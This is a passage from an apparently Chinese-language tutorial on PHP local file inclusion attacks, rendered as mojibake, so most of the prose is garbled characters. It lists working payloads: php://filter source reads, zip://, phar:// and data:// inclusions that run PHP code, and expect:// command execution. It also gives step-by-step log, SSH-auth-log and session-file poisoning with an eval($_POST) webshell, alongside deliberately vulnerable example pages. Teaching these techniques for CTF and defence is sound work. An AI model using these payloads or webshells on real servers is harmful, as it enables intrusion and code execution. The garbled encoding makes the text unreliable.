å¯ä»¥ç›´æ¥ç”¨ä¸å¸¦ä»»ä½•è¿‡æ»¤å™¨çš„filterä¼ªåè®® payload:file=php://filter/resource=flag.php ä¹Ÿå¯ä»¥ç”¨ä¸€äº›æ²¡æœ‰è¿‡æ»¤æ‰çš„ç¼–ç æ–¹å¼å’Œè½¬æ¢æ–¹å¼ payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php æ€ä¹ˆå†™å…¥ä¸€å¥è¯æœ¨é©¬? $filename = $_GET['file']; $content = $_GET['content']; file_put_contents($filename,\"&lt;?php exit();\".$content); exit() é€€å‡ºç¨‹åº è¿™æ ·å³ä½¿æ’å…¥äº†ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨è¢«ä½¿ç”¨çš„æ—¶å€™ä¹Ÿæ— æ³•è¢«æ‰§è¡Œã€‚è¿™æ ·çš„æ­»äº¡exité€šå¸¸å­˜åœ¨äºç¼“å­˜ã€é… ç½®æ–‡ä»¶ç­‰ç­‰ä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶å½“ä¸­ã€‚ exitæ­»äº¡ç»•è¿‡å‚è€ƒï¼šhttps://xz.aliyun.com/t/8163 POC1ç›´æ¥è¯»å–xxx.phpæ–‡ä»¶ï¼Œä½†å¤§å¤šæ•°æ—¶å€™å¾ˆå¤šä¿¡æ¯æ— æ³•ç›´æ¥æ˜¾ç¤ºåœ¨æµè§ˆå™¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥éœ€è¦é‡‡å–POC2ä¸­æ–¹æ³•å°†æ–‡ä»¶å†…å®¹è¿›è¡Œbase64ç¼–ç åæ˜¾ç¤ºåœ¨æµè§ˆå™¨ä¸Šï¼Œå†è‡ªè¡Œè§£ç ã€‚ æ³¨ï¼šæ›´å¤šphp://filterç”¨æ³•å¯å‚è€ƒï¼šè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ eg1: &lt;meta charset=\"utf8\"&gt; &lt;?php error_reporting(0); $file = $_GET[\"file\"]; if(stristr($file,\"php://input\") || stristr($file,\"zip://\") || stristr($file,\"phar://\") || stristr($file,\"data:\")){ exit('hacker!'); } if($file){ include($file); }else{ echo '&lt;a href=\"?file=flag.php\"&gt;tips&lt;/a&gt;'; } ?&gt; å°è¯•payloadï¼š?file=php://filter/resource=flag.phpï¼Œå‘ç°æ— æ³•æ˜¾ç¤ºå†…å®¹ï¼š å°è¯•payloadï¼š?file=php://filter/read=convert.base64-encode/resource=flag.phpï¼Œå¾—åˆ°ä¸€ä¸²base64å­—ç¬¦ï¼Œè§£ç å¾—flagåœ¨flag.phpæºç ä¸­çš„æ³¨é‡Šé‡Œï¼š 2.3 zip:// zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚(phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0) è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23ï¼ˆå³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰ åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚ ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2:// file=compress.zlib://flag.php poc: zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶] ?file=zip://D:\\zip.jpg%23phpinfo.txt ä¾‹å­ï¼š //index.php &lt;meta charset=\"utf8\"&gt; &lt;?php error_reporting(0); $file = $_GET[\"file\"]; if (!$file) echo '&lt;a href=\"?file=upload\"&gt;upload?&lt;/a&gt;'; if(stristr($file,\"input\")||stristr($file, \"filter\")||stristr($file,\"data\")/*||stristr($file,\"phar\")*/){ echo \"hick?\"; exit(); }else{ include($file.\".php\"); } ?&gt; &lt;!-- flagåœ¨å½“å‰ç›®å½•çš„æŸä¸ªæ–‡ä»¶ä¸­ --&gt; //upload.php &lt;meta charset=\"utf-8\"&gt; &lt;form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\" &gt; &lt;input type=\"file\" name=\"fupload\" /&gt; &lt;input type=\"submit\" value=\"upload!\" /&gt; &lt;/form&gt; you can upload jpg,png,zip....&lt;br /&gt; &lt;?php if( isset( $_FILES['fupload'] ) ) { $uploaded_name = $_FILES[ 'fupload' ][ 'name' ]; //æ–‡ä»¶å $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); //æ–‡ä»¶åç¼€ $uploaded_size = $_FILES[ 'fupload' ][ 'size' ]; //æ–‡ä»¶å¤§å° $uploaded_tmp = $_FILES[ 'fupload' ][ 'tmp_name' ]; // å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§° $target_path = \"uploads\\\\\".md5(uniqid(rand())).\".\".$uploaded_ext; if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" || strtolower( $uploaded_ext ) == \"zip\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {// No echo '&lt;pre&gt;upload error&lt;/pre&gt;'; } else {// Yes! echo \"&lt;pre&gt;\".dirname(__FILE__).\"\\\\{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { echo '&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'; } } ?&gt; //ä¼ å‚çš„æ—¶å€™åˆ©ç”¨ä¸Šé¢çš„pocï¼Œæ­¤æ—¶ä¼šæˆåŠŸç»•è¿‡ï¼Œå¹¶ä¸”æ‰§è¡Œphpinfo.txtæ–‡ä»¶é‡Œçš„ä»£ç ï¼ˆè¢«å½“åšphpä»£ç æ‰§è¡Œï¼‰ 2.4 data://ä¸phar:// data:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚(è¿™æ˜¯ä¸€ä¸ªè¾“å…¥æµæ‰§è¡Œçš„åè®®ï¼Œå®ƒå¯ä»¥å‘æœåŠ¡å™¨è¾“å…¥æ•°æ®ï¼Œè€ŒæœåŠ¡å™¨ä¹Ÿä¼šæ‰§è¡Œã€‚) åˆ©ç”¨æ¡ä»¶: phpç‰ˆæœ¬å¤§äºç­‰äºphp5.2 allow_url_fopen = On allow_url_include = On poc:è‹¥çº¯æ–‡å­—æ²¡ç”¨å¯ç”¨[base64ç¼–ç ] data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; ?file=data://,&lt;?php phpinfo();?&gt; ?file=data://text/plain,&lt;?php phpinfo();?&gt; ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ ?file=data:text/plain,&lt;?php phpinfo();?&gt; ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ phar:// æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚ phar://ä¸­ç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„éƒ½å¯ä»¥ä½¿ç”¨ åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬å¤§äºç­‰äºphp5.3.0 poc: å‡è®¾æœ‰ä¸ªæ–‡ä»¶phpinfo.txtï¼Œå…¶å†…å®¹ä¸º&lt;?php phpinfo(); ?&gt;ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š æŒ‡å®šç»å¯¹è·¯å¾„ index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt æˆ–è€…ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼ˆè¿™é‡Œtest.zipå°±åœ¨å½“å‰ç›®å½•ä¸‹ï¼‰ index.php?file=phar://test.zip/phpinfo.txt 2.5 expect://ä¼ªåè®® expect://ä¼ªåè®®ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦å®‰è£…æ‹“å±• ç”¨æ³•: ?file=expect://ls 0x03 ç‰¹æ®Šæ–‡ä»¶åŒ…å« æœåŠ¡å™¨çš„ä¸­é—´ä»¶ï¼ŒsshæœåŠ¡éƒ½æœ‰æ—¥å¿—è®°å½•çš„åŠŸèƒ½ã€‚å¦‚æœå¼€å¯äº†æ—¥å¿—è®°å½•åŠŸèƒ½ï¼Œç”¨æˆ·è®¿é—®çš„æ—¥å¿—å°±ä¼šå­˜å‚¨åˆ°ä¸åŒæœåŠ¡çš„ç›¸å…³æ–‡ä»¶ã€‚ å¦‚æœæ—¥å¿—æ–‡ä»¶çš„ä½ç½®æ˜¯é»˜è®¤ä½ç½®æˆ–è€…æ˜¯å¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•è·å–ï¼Œå°±å¯ä»¥é€šè¿‡è®¿é—®æ—¥å¿—å°†æ¶æ„ä»£ç å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­å»ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ—¥å¿—ä¸­çš„æ¶æ„ä»£ç ï¼Œè·å¾—æƒé™ã€‚ å…¸å‹çš„æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼š ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å« sshæ—¥å¿—æ–‡ä»¶åŒ…å« ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶åŒ…å« åˆ©ç”¨æ¡ä»¶ï¼š webä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œå¹¶ä¸”å…·æœ‰å¯è¯»æƒé™ ä¸‹é¢å¼€å§‹ä»‹ç»æ—¥å¿—æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ­¥éª¤ 1. å°†æ¶æ„ä»£ç å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ ä¸­é—´ä»¶å¼€å¯äº†è®¿é—®æ—¥å¿—è®°å½•åŠŸèƒ½ï¼Œä¼šè®¿é—®æ—¥å¿—å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ å‡è®¾è®¿é—®URLï¼šhttp://192.168.1.2/xxx/index.php å‘ç°ä¼šåœ¨æ—¥å¿—æ–‡ä»¶ä¸­æœ‰å¦‚ä¸‹å†…å®¹ï¼š [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:31:20 +0800] \"GET /xxx/index.php HTTP/1.1\" 200 86.... ä¸­é—´ä»¶æ—¥å¿—è®¿é—®ä¼šè®°å½•è®¿é—®è€…çš„IPåœ°å€ã€è®¿é—®æ—¶é—´ã€è®¿é—®è·¯å¾„ã€è¿”å›çŠ¶æ€ç ç­‰ç­‰ã€‚ åˆ©ç”¨ä¸­é—´ä»¶è®¿é—®è®°å½•è·¯å¾„åˆ°æ—¥å¿—æ–‡ä»¶ä¸­çš„åŠŸèƒ½ï¼Œå°†æ¶æ„ä»£ç å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶å½“ä¸­å»ï¼š æ·»åŠ æ¶æ„ä»£ç ï¼šhttp://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt; æ­¤æ—¶ä¼šæç¤º404ï¼Œä½†æ˜¯ä¸æ€¥ æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œå‘ç°å·²ç»å°†å†…å®¹å†™å…¥ [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] \"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1\" 404 826.... è™½ç„¶å·²ç»å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­å»äº†ï¼Œä½†æ˜¯æµè§ˆå™¨è¿›è¡Œäº†URLç¼–ç ï¼Œå¯¼è‡´ä¼ å…¥çš„ä»£ç ä¸èƒ½æ­£å¸¸ä½¿ç”¨ å¯ä»¥é€šè¿‡burpsuiteæŠ“åŒ…çš„æ–¹å¼å†™å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ä¸ä¼šè¢«æµè§ˆå™¨è¿›è¡ŒURLç¼–ç  æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] \"GET /xxx/&lt;?php @eval($_POST[123]);?&gt; HTTP/1.1\" 404 302.... æ¶æ„ä»£ç æˆåŠŸå†™å…¥ 2. æ–‡ä»¶åŒ…å«æ—¥å¿—æ–‡ä»¶ è¦æ‰§è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¿…é¡»è¦çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„ä½ç½®ã€‚ å¸¸è§çš„ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶éƒ½æœ‰é»˜è®¤çš„å­˜å‚¨è·¯å¾„ï¼Œæ¯”å¦‚Apacheçš„ä¸­é—´ä»¶æ—¥å¿—æ–‡ä»¶å­˜åœ¨/var/log/httpd/ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå«access_log è¾“å…¥æµ‹è¯•è¯­å¥http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log ä¹‹ååœ¨å‘ç½‘é¡µä¼ å…¥POSTå‚æ•°ï¼š123=phpinfo å³å¯æ˜¾ç¤ºå‡ºphpinfoçš„å†…å®¹ 3.1 åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ WEBæœåŠ¡å™¨ä¸€èˆ¬ä¼šå°†ç”¨æˆ·çš„è®¿é—®è®°å½•ä¿å­˜åœ¨è®¿é—®æ—¥å¿—ä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®æ—¥å¿—è®°å½•çš„å†…å®¹ï¼Œç²¾å¿ƒæ„é€ è¯·æ±‚ï¼ŒæŠŠPHPä»£ç æ’å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ—¥å¿—ä¸­çš„PHPä»£ç ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯» çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½• æ³¨æ„ï¼š ä¸€èˆ¬æƒ…å†µä¸‹æ—¥è‡³å­˜å‚¨ç›®å½•ä¼šè¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶(httpd.conf,nginx.conf....)æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥ æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§ï¼Œæˆ–è€…å†…å®¹æ ¼å¼ Apacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚ å¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http://www.xxxx.com/,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚ å‚è€ƒæ–‡ç« ï¼š1.åŒ…å«æ—¥å¿—æ–‡ä»¶getshell 2.ä¸€é“åŒ…å«æ—¥å¿—æ–‡ä»¶çš„CTFé¢˜ è¿™é‡Œæä¾›ä¸€é“åŒ…å«æ—¥å¿—çš„CTFé¢˜ç›®ï¼šSHACTF-2017- Bon AppÃ©tit (100)-writeup 3.2 åŒ…å«SSH logæ—¥å¿—æ–‡ä»¶ åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º /var/log/auth.log ä¸‹é¢ä»‹ç»æ¼æ´åˆ©ç”¨æ­¥éª¤ 1. å°†æ¶æ„ä»£ç å†™å…¥æ–‡ä»¶ SSHå¦‚æœå¼€å¯äº†æ—¥å¿—è®°å½•çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆä¼šå°†sshçš„è¿æ¥æ—¥å¿—è®°å½•åˆ°sshæ—¥å¿—æ–‡ä»¶å½“ä¸­ å°†è¿æ¥çš„ç”¨æˆ·åè®¾ç½®æˆæ¶æ„ä»£ç ï¼Œç”¨å‘½ä»¤è¿æ¥å—å®³è€…çš„æœåŠ¡å™¨ip(192.168.1.1)çš„sshæœåŠ¡ ssh \"&lt;?php @eval($_POST[123]);?&gt;\"@192.168.1.1 æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶/var/log/auth.logï¼Œå¯ä»¥è§‚å¯Ÿåˆ°æ¶æ„ä»£ç å·²ç»å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ 2. ä½¿ç”¨æ–‡ä»¶åŒ…å«æ—¥å¿—æ–‡ä»¶ æµ‹è¯•è¾“å…¥è¯­å¥ï¼šhttp://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log ä¹‹åå†å‘ç½‘é¡µä¼ å…¥POSTå‚æ•°ï¼š123=phpinfo å°±å¯ä»¥å‡ºç°phpinfoçš„å†…å®¹äº† å‚è€ƒï¼š[RCE with LFI and SSH Log Poisoning] 3.3 åŒ…å«environ åˆ©ç”¨æ¡ä»¶ï¼š phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚ environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚ å§¿åŠ¿ï¼š proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ã€‚å¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ã€‚ä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚ å¯ä»¥å‚è€ƒè¿™ä¸ªï¼š The proc/self/environ Injection shell via LFI - proc/self/environ method 3.4 åŒ…å«fd ä¸å‰é¢çš„æ–¹æ³•ç±»ä¼¼/proc/self/environï¼Œå¯ä»¥å°†ä»£ç å¼•å…¥ proc æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œè¿™äº›ä»£ç å¯ä»¥é€šè¿‡æ˜“å—æ”»å‡»çš„ LFI è„šæœ¬æ‰§è¡Œã€‚é€šå¸¸ï¼Œæ‚¨ä¼šä½¿ç”¨ burp æˆ– curl å°† PHP ä»£ç æ³¨å…¥åˆ°referer. è¿™ç§æ–¹æ³•æœ‰ç‚¹æ£˜æ‰‹ï¼Œå› ä¸ºåŒ…å« Apache é”™è¯¯æ—¥å¿—ä¿¡æ¯çš„ proc æ–‡ä»¶åœ¨/proc/self/fd/ç­‰ä¸‹å‘ç”Ÿäº†å˜åŒ–/proc/self/fd/2ã€‚æˆ‘å»ºè®®ä½¿ç”¨ Burp Intruder + FuzzDB çš„LFI-FD/proc/self/fd/10æš´åŠ›ç ´è§£ /proc/self/fd/ ç›®å½•çš„ç›®å½•ç»“æ„-Check.txtå¯èƒ½çš„ proc æ–‡ä»¶åˆ—è¡¨ï¼Œç„¶åæ‚¨å¯ä»¥ç›‘æ§è¿”å›çš„é¡µé¢å¤§å°å¹¶è¿›è¡Œè°ƒæŸ¥ã€‚ å‚è€ƒï¼š LFI Cheat Sheetï¼š/proc/self/environ LFI Method 3.5 åŒ…å«SESSION å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡ Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ ä¸€èˆ¬é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼è·å–sessionçš„å­˜å‚¨ä½ç½®ï¼š é€šè¿‡phpinfoçš„ä¿¡æ¯è·å–sessionçš„å­˜å‚¨ä½ç½®ã€‚ é€šè¿‡phpinfoçš„ä¿¡æ¯è·å–session.save_path é€šè¿‡çŒœæµ‹é»˜è®¤çš„sessionå­˜å‚¨ä½ç½®è¿›è¡Œå°è¯• é€šå¸¸Linuxä¸­çš„Sessionçš„é»˜è®¤å­˜å‚¨ä½ç½®åœ¨/var/lib/php/sessionç›®å½•ä¸‹ phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚ sessionå¸¸è§å­˜å‚¨è·¯å¾„ï¼š /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID sessionæ–‡ä»¶æ ¼å¼ï¼š sess_[phpsessid] ï¼Œè€Œ phpsessid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚ å‚è€ƒæ–‡ç« ï¼šä¸€é“SESSIONåŒ…å«çš„CTFé¢˜ ç¤ºä¾‹åˆ†æï¼š sessionæ–‡ä»¶åŒ…å«ä»£ç å¦‚ä¸‹ session_start(); $ctfs=$_GET['ctfs']; $_SESSION['username']=$ctfs æ­¤ä»£ç å¯ä»¥é€šè¿‡GETå‹çš„ctfså‚æ•°ä¼ å…¥ã€‚PHPä»£ç å°†ä¼šè·å–çš„å€¼å­˜å…¥åˆ°Sessionä¸­ã€‚ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ctfså‚æ•°å°†æ¶æ„ä»£ç å†™å…¥åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤sessionæ–‡ä»¶ï¼Œå‘ç³»ç»Ÿä¸­ä¼ é€’æ¶æ„ä»£ç ã€‚ æ¼æ´åˆ†æ ä¸Šé¢çš„ä»£ç æ»¡è¶³Sessionæ–‡ä»¶åŒ…å«çš„ä¸¤ä¸ªè¦æ±‚ PHPä»£ç å°†ä¼šè·å–ctfså˜é‡çš„å€¼å­˜å…¥åˆ°sessionä¸­ Sessionçš„é»˜è®¤ å­˜å‚¨ä½ç½®æ˜¯/var/lib/php/session è®¿é—®URLï¼šhttp://www.abc.com/xxx/session.php?ctfs=a ä¼šåœ¨/var/lib/php/sessionç›®å½•ä¸‹é™ctfsä¼ å…¥çš„å€¼å­˜å‚¨åˆ°sessionä¸­ Sessionçš„æ–‡ä»¶åä»¥sess_å¼€å¤´ï¼Œåè·ŸSessionidï¼ŒSessionidå¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–ï¼š å•å‡»å³é”®â€”â€”æ£€æŸ¥â€”â€”å­˜å‚¨â€”â€”Cookieâ€”â€”PHPSESSID å°±å¯ä»¥æ‰¾åˆ°å†…å®¹ å‡è®¾é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–åˆ°çš„sessionidçš„å€¼ä¸ºhufh7hsdf392eurh4,æ‰€ä»¥sessionçš„æ–‡ä»¶åä¸ºsess_hufh7hsdf392eurh4 åœ¨/var/lib/php/sessionç›®å½•ä¸‹æŸ¥çœ‹æ­¤æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼šusername|s:4:â€œaâ€ æ¼æ´åˆ©ç”¨ é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥å¾—çŸ¥ï¼Œå‘ctfså‚æ•°ä¼ å…¥çš„å†…å®¹ä¼šå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ã€‚ å¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ctfså†™å…¥æ¶æ„ä»£ç åˆ°Sessionæ–‡ä»¶å½“ä¸­å»ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œgetshell ä¾‹å¦‚ï¼šè®¿é—®ä»£ç http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;åï¼Œä¼šåœ¨/var/lib/php/sessionç›®å½•ä¸‹é™ctfsçš„å€¼å†™å…¥sessionæ–‡ä»¶ sessionæ–‡ä»¶çš„å†…å®¹ä¸ºï¼šusername|s:18:\"&lt;?php phpinfo();?&gt;\". æ”»å‡»æ­¥éª¤ å°†æ¶æ„ä»£ç å†™å…¥sessionæ–‡ä»¶ æ”»å‡»è€…å¯ä»¥é€šè¿‡PHPinfoæˆ–è€…çŒœæµ‹åˆ°sessionå­˜æ”¾çš„ä½ç½® é€šè¿‡å¼€å‘è€…æ¨¡å¼å¯ä»¥è·å¾—æ–‡ä»¶åç§° é€šè¿‡æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è§£æsessionæ–‡ä»¶è¾¾åˆ°æ”»å‡»çš„ç›®çš„ æ¯”å¦‚ï¼šhttp://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2 3.6 åŒ…å«ä¸´æ—¶æ–‡ä»¶ phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\\winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚ ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ 